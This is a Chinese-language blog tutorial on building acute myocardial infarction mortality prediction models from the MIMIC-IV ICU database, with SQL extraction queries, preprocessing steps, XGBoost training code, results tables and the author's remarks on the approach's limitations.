<p>0.4版的压缩包有6.7G,要获取需要在网站注册帐号并进行考试答题，然后同意他们关于医学伦理的条款 下载地址： <span class="exturl" data-url="aHR0cHM6Ly9waHlzaW9uZXQub3JnL2NvbnRlbnQvbWltaWNpdi8wLjQv">https://physionet.org/content/mimiciv/0.4/<i class="fa fa-external-link-alt"></i></span> 并没有BT种子之类下载方式，下载需要帐号验证，由于版权和隐私等原因，应该也不能进行二次分发 所以大家自己去下吧。</p>
<p>通过考试答题后就直接点下载链接就好了。 官网还提供了wget的下载方式，安装包有点大，我们打开bbr下载会快一点（有美国代理记得挂）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> sysctl net.ipv4.tcp_congestion_control<span class="token operator">=</span>bbr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后填你的用户名和密码就好了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -r -N -c -np --user username --ask-password https://physionet.org/files/mimiciv/0.4/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>下载好建库的时候记得建索引，不然后续操作会很慢</p>
<h2 id="患者筛选">患者筛选</h2>
<p>在MIMIC数据库中提取ICD-9疾病编号为410大类、疾病名称为 acute myocardial infarction的相关病人全部住院记录。数据表DIAGNOSE_ICD中的ICD9_CODE字段记录了患者的ICD-9编码，其中410大类编码根据发病部位被分为10个小类，例如第1个小类代表发病部位为前外侧壁、第2个小类代表发病部位为下外侧壁；这10 个小类又根据发病时期分为3个小类，0代表未细分，1代表初次入院，2代表再入院；例如，MIMIC数据库中ICD9_CODE字段为41031，对应的ICD-9编码为410.3.1，其中410代表急性心肌梗死，3代表下后壁，1代表初次入院。 <img src="%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96%E6%B5%81%E7%A8%8B.svg" alt="数据提取示意图" /></p>
<p>提取到的除后续照顾类别以外的410大类患者数据中，共有5087次入院记录，去除同一患者重复的入院记录，共有4788名病人患有急性心肌梗死（包括同时患有急性心肌梗死的并发症），其中有727人死亡，总死亡率15.18%。男性患者共2924名，平均年龄为67.2岁，死亡391人，男性死亡率13.37%；女性患者共1864名，平均年龄为73.4岁，死亡337人,女性死亡率18.10%。统计急性心肌梗死患者人群种族信息，可以发现亚裔只有74次入院记录。 特征选取</p>
<p>MIIMC里面能用的特征大概有性别年龄这些个人信息、心率血压这些生理指标、还有些用药记录之类的，为了预测患者初次发病的死亡率，只采用患者初次入院24小时内的记录检查项目作为预测指标</p>
<p>先把24小时ICUSTAY_ID选出来</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> k_AMI2 <span class="token keyword">AS</span>
<span class="token keyword">SELECT</span>
	ADMISSIONS<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>
	ADMISSIONS<span class="token punctuation">.</span>HADM_ID<span class="token punctuation">,</span>
	ADMISSIONS<span class="token punctuation">.</span>ADMITTIME<span class="token punctuation">,</span>
	ADMISSIONS<span class="token punctuation">.</span>DEATHTIME
<span class="token keyword">FROM</span>
	ADMISSIONS<span class="token punctuation">,</span>
	<span class="token punctuation">(</span>
		<span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span>
			A<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>
			<span class="token function">MAX</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>ADMITTIME<span class="token punctuation">)</span> ADMITTIME
		<span class="token keyword">FROM</span>
			ADMISSIONS A<span class="token punctuation">,</span>
			DIAGNOSES_ICD B
		<span class="token keyword">WHERE</span>
			A<span class="token punctuation">.</span>HADM_ID <span class="token operator">=</span> B<span class="token punctuation">.</span>HADM_ID
		<span class="token operator">AND</span> <span class="token punctuation">(</span>
			ICD9_CODE <span class="token operator">=</span> <span class="token string">"41000"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41001"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41010"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41011"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41020"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41021"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41030"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41031"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41040"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41041"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41050"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41051"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41060"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41061"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41070"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41081"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41090"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41091"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41002"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41012"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41022"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41032"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41042"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41052"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41062"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41072"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41082"</span>
			<span class="token operator">OR</span> ICD9_CODE <span class="token operator">=</span> <span class="token string">"41092"</span>
		<span class="token punctuation">)</span>
		<span class="token keyword">GROUP</span> <span class="token keyword">BY</span>
			A<span class="token punctuation">.</span>SUBJECT_ID
	<span class="token punctuation">)</span> <span class="token keyword">AS</span> T
<span class="token keyword">WHERE</span>
	ADMISSIONS<span class="token punctuation">.</span>ADMITTIME <span class="token operator">=</span> T<span class="token punctuation">.</span>ADMITTIME
<span class="token operator">AND</span> ADMISSIONS<span class="token punctuation">.</span>SUBJECT_ID <span class="token operator">=</span> T<span class="token punctuation">.</span>SUBJECT_ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后用找患者检查项目、生理指标的ITEM_ID。写一个简单的SQL联接查询就可以了：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span>
	SUBJECT_ID<span class="token punctuation">,</span>
	<span class="token function">MAX</span><span class="token punctuation">(</span>VALUEUOM<span class="token punctuation">)</span> MAX_VALUE<span class="token punctuation">,</span>
	<span class="token function">MIN</span><span class="token punctuation">(</span>VALUEUOM<span class="token punctuation">)</span> MIN_VALUE
<span class="token keyword">FROM</span>
	<span class="token punctuation">(</span>
	<span class="token keyword">SELECT</span>
		CHARTEVENTS<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>ICUSTAY_ID<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>CHARTTIME<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span><span class="token punctuation">`</span><span class="token keyword">VALUE</span><span class="token punctuation">`</span><span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>VALUEUOM<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>ERROR<span class="token punctuation">,</span>
		TIMESTAMPDIFF<span class="token punctuation">(</span> <span class="token keyword">HOUR</span><span class="token punctuation">,</span> T<span class="token punctuation">.</span>INTIME<span class="token punctuation">,</span> CHARTEVENTS<span class="token punctuation">.</span>CHARTTIME <span class="token punctuation">)</span> STAYHOUR 
	<span class="token keyword">FROM</span>
		CHARTEVENTS<span class="token punctuation">,</span>
		A_AKF_DEATH T 
	<span class="token keyword">WHERE</span>
		CHARTEVENTS<span class="token punctuation">.</span>ICUSTAY_ID <span class="token operator">=</span> T<span class="token punctuation">.</span>ICUSTAY_ID 
		<span class="token operator">AND</span> <span class="token punctuation">(</span> CHARTEVENTS<span class="token punctuation">.</span>ITEMID <span class="token operator">=</span> <span class="token number">220546</span> <span class="token operator">OR</span> CHARTEVENTS<span class="token punctuation">.</span>ITEMID <span class="token operator">=</span> <span class="token number">1542</span> <span class="token punctuation">)</span>
	<span class="token keyword">ORDER</span> <span class="token keyword">BY</span>
		CHARTEVENTS<span class="token punctuation">.</span>SUBJECT_ID 
	<span class="token punctuation">)</span> AA
<span class="token keyword">WHERE</span>
	STAYHOUR <span class="token operator">&lt;=</span> <span class="token number">24</span> 
<span class="token keyword">GROUP</span> <span class="token keyword">BY</span>
	SUBJECT_ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本次选取的急性心肌梗死患者主要特征见下表：</p>
<table>
<thead>
<tr class="header">
<th>特征</th>
<th>字段或ITEMID</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>年龄</td>
<td>PTENETS.DOD和DOB</td>
</tr>
<tr class="even">
<td>性别</td>
<td>PATIENTS.GENDER</td>
</tr>
<tr class="odd">
<td>心率</td>
<td>CHARTEVENTS.ITEMID</td>
</tr>
<tr class="even">
<td>入院类型</td>
<td>ADMISSION_TYPE</td>
</tr>
<tr class="odd">
<td>ICD细分编码</td>
<td>ADMISSION.ICD9_CODE</td>
</tr>
<tr class="even">
<td>最小GCS评分</td>
<td>220739、223901、223900、198</td>
</tr>
<tr class="odd">
<td>排尿量</td>
<td>40055、226559</td>
</tr>
<tr class="even">
<td>PaO2</td>
<td>779、220224</td>
</tr>
<tr class="odd">
<td>白细胞计数WBC</td>
<td>220546、15424、200、1127、861</td>
</tr>
<tr class="even">
<td>体温</td>
<td>676、223762、678、223761</td>
</tr>
<tr class="odd">
<td>血钾浓度</td>
<td>50971</td>
</tr>
<tr class="even">
<td>血钠浓度</td>
<td>50983</td>
</tr>
<tr class="odd">
<td>血胆红素浓度</td>
<td>50885</td>
</tr>
<tr class="even">
<td>是否有血液恶性肿瘤</td>
<td>ICD9_CODE =200XX-208XX</td>
</tr>
<tr class="odd">
<td>收缩压</td>
<td>51、220050</td>
</tr>
<tr class="even">
<td>动脉收缩压</td>
<td>455、220179</td>
</tr>
<tr class="odd">
<td>血清尿素水平</td>
<td>51006</td>
</tr>
</tbody>
</table>
<h3 id="归一化和标准化">归一化和标准化</h3>
<p>为了将患者特征转换成便于机器学习模型输入训练的特征变量的形式，对于MIMIC数据库中患者初次入院24小时中多次测量并记录的化验指标，选取最小值、最大值和平均值作为三个不同的特征。</p>
<p>然后对数字变量进行归一化，把标准差置为1，均值置为零（ICD细分编码之类的虽然是数字，但实际上是一个类别特征，应作为类别特征处理）</p>
<p>对于性别种族等类别特征，进行Onehot编码转换为梯度提升树模型能够接受的类型；以性别为例，将性别为女编码为01，性别为男编码为10。（LightGBM等可以用直方图算法之类的方式直接处理类别特征，不需要该操作）经过上述处理，共筛选并构建出42个急性心肌梗死患者的特征维度。</p>
<h3 id="缺失值填补">缺失值填补</h3>
<p>由于MIMIC数据库中的数据是由两家不同的医院在10年间的ICU重症监护记录整合而成，急性心肌梗死患者的数据存在缺失和不统一的问题。以化验项目血清碳酸氢水平为例，在提取得到的4788份急性心肌梗死患者样本数据中，有4730份血清碳酸氢数据记录是完整的，有58份是缺失的，缺失率1.2%；但是部分检查指标，如收缩压，4788个样本中只有2665份完整数据，缺失率44.3%。</p>
<p>对于SVM等对于缺失值敏感的算法，用均值填补空缺数据的方法；对于缺失值不敏感的决策树类算法（如GBDT）和自带缺失值处理的算法（如XGBoost），将缺失值置为-1。</p>
<p>（缺失率在40%左右的会影响模型的效果，但是收缩压之类的又很重要，不能轻易舍弃）</p>
<figure>
<img src="/morality-prediction/image-20200603192151696.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<h3 id="数据集不平衡的问题">数据集不平衡的问题</h3>
<p>有的疾病可能会有，急性心肌梗死由于死亡率很高，正负样本比例已经超过了1：9，并不是那种极端不平衡的问题。有的疾病死亡率1%左右需要采样等方式构造平衡数据集。</p>
<h2 id="模型训练">模型训练</h2>
<p>直接用的scikit-learn工具包，随便调了调参。决策树类的bsoosting算法表现都还不错，像GBDT啊，XGBoost啊，LightGBM啊。数据量还是有点小了，就没上深度学习那些网络。直接调sklearn的包调一下参：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd
<span class="token comment"># pd.options.mode.chained_assignment = None</span>
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> lightgbm <span class="token keyword">as</span> lgb


<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> preprocessing
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span> train_test_split<span class="token punctuation">,</span>cross_val_score<span class="token punctuation">,</span>cross_val_predict
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>ensemble <span class="token keyword">import</span> RandomTreesEmbedding<span class="token punctuation">,</span> RandomForestClassifier<span class="token punctuation">,</span> GradientBoostingClassifier
<span class="token comment"># criteria</span>
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>metrics <span class="token keyword">import</span> accuracy_score<span class="token punctuation">,</span> roc_auc_score<span class="token punctuation">,</span> f1_score<span class="token punctuation">,</span>recall_score<span class="token punctuation">,</span> precision_score<span class="token punctuation">,</span> roc_curve


<span class="token comment"># 加载数据</span>
data <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'./data/train_data_modified.csv'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> data<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>frac<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> random_state<span class="token operator">=</span><span class="token number">42</span><span class="token punctuation">)</span>
data_x <span class="token operator">=</span> data<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token comment"># data_x = data.iloc[:,[1,2,3,4,5,6,7,36]]</span>
lbl <span class="token operator">=</span> preprocessing<span class="token punctuation">.</span>LabelEncoder<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># data_x['M'] = lbl.fit_transform(data_x['M'].astype(str))#将含有字符的类别特征这一列进行转换</span>
<span class="token comment"># data_x['EMERGENCY'] = lbl.fit_transform(data_x['EMERGENCY'].astype(str))#将含有字符的类别特征这一列进行转换</span>
data_y <span class="token operator">=</span> data<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># 准备一个train/test来构建模型。</span>
x_train<span class="token punctuation">,</span> x_test<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> y_test <span class="token operator">=</span> train_test_split<span class="token punctuation">(</span>data_x<span class="token punctuation">,</span>
                                                    data_y<span class="token punctuation">,</span> 
                                                    test_size<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span> 
                                                    random_state<span class="token operator">=</span><span class="token number">52</span><span class="token punctuation">,</span>
                                                    <span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>x_train<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> x_test<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> y_train<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> y_test<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>


<span class="token keyword">from</span> xgboost<span class="token punctuation">.</span>sklearn <span class="token keyword">import</span> XGBClassifier
xgb <span class="token operator">=</span> XGBClassifier<span class="token punctuation">(</span>
    n_estimators<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>
    learning_rate <span class="token operator">=</span><span class="token number">0.09</span><span class="token punctuation">,</span>
    max_depth<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>
    min_child_weight<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    gamma<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">,</span>
    subsample<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>
    colsample_bytree<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>
    objective<span class="token operator">=</span> <span class="token string">'binary:logistic'</span><span class="token punctuation">,</span>
    nthread<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>
    scale_pos_weight<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    reg_lambda<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    seed<span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">)</span>
<span class="token comment"># xgb = HistGradientBoostingClassifier(learning_rate=0.09)</span>
xgb<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">)</span>

y_pred_xgb <span class="token operator">=</span> xgb<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>


y_pred_xgb_pr <span class="token operator">=</span> xgb<span class="token punctuation">.</span>predict_proba<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
fpr_xgb<span class="token punctuation">,</span>tpr_xgb<span class="token punctuation">,</span>thresholds  <span class="token operator">=</span> roc_curve<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span>y_pred_xgb_pr<span class="token punctuation">)</span>

<span class="token comment"># y_pred_xgb = y_pred_xgb_pr > 0.5</span>
<span class="token comment"># print(lr.coef_) #W</span>
<span class="token comment"># print(lr.intercept_) #b</span>
<span class="token comment"># 评价指标</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"auc面积:"</span><span class="token punctuation">,</span>roc_auc_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb_pr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"精确率:"</span><span class="token punctuation">,</span>precision_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"召回率:"</span><span class="token punctuation">,</span>recall_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确率:"</span><span class="token punctuation">,</span>accuracy_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"F1值:"</span><span class="token punctuation">,</span>f1_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="死亡率预测">死亡率预测</h2>
<h3 id="结果">结果</h3>
<p>表3-3 几种机器学习方法的死亡率预测结果如下表：</p>
<table>
<thead>
<tr class="header">
<th></th>
<th>GBDT</th>
<th>LR</th>
<th>KNN</th>
<th>SVM</th>
<th>XGBoost</th>
<th>LightGBM</th>
<th>NB</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>AUC</td>
<td>0.834</td>
<td>0.780</td>
<td>0.695</td>
<td>0.779</td>
<td>0.851</td>
<td>0.844</td>
<td>0.777</td>
</tr>
<tr class="even">
<td>精确率</td>
<td>0.676</td>
<td>0.618</td>
<td>0.5</td>
<td>0.688</td>
<td>0.690</td>
<td>0.663</td>
<td>0.378</td>
</tr>
<tr class="odd">
<td>召回率</td>
<td>0.320</td>
<td>0.239</td>
<td>0.162</td>
<td>0.155</td>
<td>0.329</td>
<td>0.330</td>
<td>0.479</td>
</tr>
<tr class="even">
<td>准确率</td>
<td>0.879</td>
<td>0.865</td>
<td>0.852</td>
<td>0.864</td>
<td>0.875</td>
<td>0.872</td>
<td>0.806</td>
</tr>
<tr class="odd">
<td>F1 值</td>
<td>0.451</td>
<td>0.345</td>
<td>0.245</td>
<td>0.253</td>
<td>0.443</td>
<td>0.439</td>
<td>0.422</td>
</tr>
</tbody>
</table>
<p>看上去准确率挺高，实际结果不太好，召回率太低了。召回率的意义是真阳性率（True Positive Rate），也就是预测到的死亡患者占所有患者的比例，大概真正死亡的患者只有一半被预测了出来。</p>
<table>
<thead>
<tr class="header">
<th></th>
<th>实际死亡</th>
<th>实际存活</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>预测死亡</td>
<td>真阳性（TP）</td>
<td>假阳性（FP）</td>
</tr>
<tr class="even">
<td>预测存活</td>
<td>假阴性（FN）</td>
<td>真阴性（TN）</td>
</tr>
</tbody>
</table>
<p>由于数据集还是太小，就没有细分搞成多分类的问题预测一下短期（30天）和长期（90天以上）死亡率，数据集大了可以做一下。数据集再大可以做细分，比如STEMI和NSTEMI的细分或者</p>
<h3 id="roc曲线">ROC曲线</h3>
<figure>
<img src="/morality-prediction/image-20200531203632378.png" alt="几种机器学习方法的ROC曲线" /><figcaption aria-hidden="true">几种机器学习方法的ROC曲线</figcaption>
</figure>
<h3 id="特征权重">特征权重</h3>
<p>以GBDT为例，提取训练模型的决策树权重，结果如图3-3所示。由图可知，梯度提升树模型认为最重要的10个指标为当日最小血清碳酸氢水平、平均动脉血二氧化碳分压、平均排尿量、心率范围、最小心率、肌酐、体温范围、当日最大收缩压、当日心率标准差、年龄。</p>
<figure>
<img src="/morality-prediction/image-20200531210528257.png" alt="GBDT的特征权重" /><figcaption aria-hidden="true">GBDT的特征权重</figcaption>
</figure>
<h2 id="其他问题">其他问题</h2>
<p>这个，急性心肌梗死这个直接看心电图或者彩超啥的更好一些，准确率一般不会低于90%。心血管疾病这种做这个预测基本没有太大意义。急性肾衰竭啥的可能更有意义一点</p>
<p>MIMIC数据库里面的数据亚裔很少，放到国内可能不太合适。护理和临床记录方式也差别不小。</p>
<p>这是2001-2012年的数据，近十年来医学水平提高了不少，包括再灌注等手段，死亡率已经下降了，用这批数据预测现在的可能会偏高</p>
<h2 id="补充说明">补充说明</h2>
<h3 id="mimic数据库表格名称及用途">MIMIC数据库表格名称及用途</h3>
<table>
<colgroup>
<col style="width: 20%" />
<col style="width: 53%" />
<col style="width: 26%" />
</colgroup>
<thead>
<tr class="header">
<th>表格名称</th>
<th>表格内容</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ADMISSIONS（入院表）</td>
<td>提供有关患者的入院信息，由于为病人进行的每次唯一的医院访问都分配了一个唯一的信息<code>HADM_ID</code>，因此ADMISSIONS表可以被认为是<code>HADM_ID</code></td>
<td></td>
</tr>
<tr class="even">
<td>CALLOUT(标注表)</td>
<td>提供患者何时准备好从ICU出院以及患者何时实际从ICU出院的信息</td>
<td></td>
</tr>
<tr class="odd">
<td>caregivers</td>
<td>记录医护人员信息（ID、类型、附加信息）</td>
<td></td>
</tr>
<tr class="even">
<td>chartevents</td>
<td>记录所有病人的图表数据，住院期间的所有症状、体征、精神状态、实验室检查等</td>
<td></td>
</tr>
<tr class="odd">
<td>cptevents</td>
<td>包含当前的程序术语（CPT）代码，这些代码便于为在患者身上执行的操作计费。</td>
<td></td>
</tr>
<tr class="even">
<td>d_cpt</td>
<td>当前程序术语（CPT）代码的高级定义</td>
<td></td>
</tr>
<tr class="odd">
<td>prescriptions（处方）</td>
<td>包含药物相关的订单条目，即处方</td>
<td></td>
</tr>
<tr class="even">
<td>inputevents_cv</td>
<td>患者输入数据（流入患者体内液体信息）</td>
<td>表格来源CareVue ICU数据库。</td>
</tr>
<tr class="odd">
<td>inputeevents_mv</td>
<td>患者输入数据（流入患者体内液体信息）</td>
<td>表格来源Metavision ICU数据库。</td>
</tr>
<tr class="even">
<td>outputevent</td>
<td>患者的输出数据。</td>
<td></td>
</tr>
<tr class="odd">
<td>labevents</td>
<td>包含给定患者的所有实验室测量值，包括患者数据（ITEMID、VALUE）</td>
<td></td>
</tr>
<tr class="even">
<td>d_icd_diagnoses</td>
<td>ICD-9疾病诊断的定义表,对 疾病编码的解释</td>
<td></td>
</tr>
<tr class="odd">
<td>d_icd_procedures</td>
<td>ICD-9治疗程序代码的解释</td>
<td></td>
</tr>
<tr class="even">
<td>d_items</td>
<td>ICU数据库中所有项目的定义表</td>
<td></td>
</tr>
<tr class="odd">
<td>d_labitems</td>
<td>所有实验室测量的定义表（对ITEMID的解释，对应数据类型，关联的LOINC代码）</td>
<td></td>
</tr>
<tr class="even">
<td>datetimeevents</td>
<td>包含所有日期格式的数据</td>
<td></td>
</tr>
<tr class="odd">
<td>diagnoses_icd（诊断表）</td>
<td>包含患者住院期间所有ICD-9诊断</td>
<td></td>
</tr>
<tr class="even">
<td>drgcodes</td>
<td>包含患者的诊断相关组（DRG）代码</td>
<td></td>
</tr>
<tr class="odd">
<td>icustays</td>
<td>患者在ICU内的住院概要（入住或者转出ICU的时间等）</td>
<td></td>
</tr>
<tr class="even">
<td>microbiologyevents</td>
<td>包含微生物学信息，包括进行的测试和敏感性</td>
<td></td>
</tr>
<tr class="odd">
<td>noteevents</td>
<td>包含所有患者注意事项。，主要是不便于数字化的报告</td>
<td></td>
</tr>
<tr class="even">
<td>patients</td>
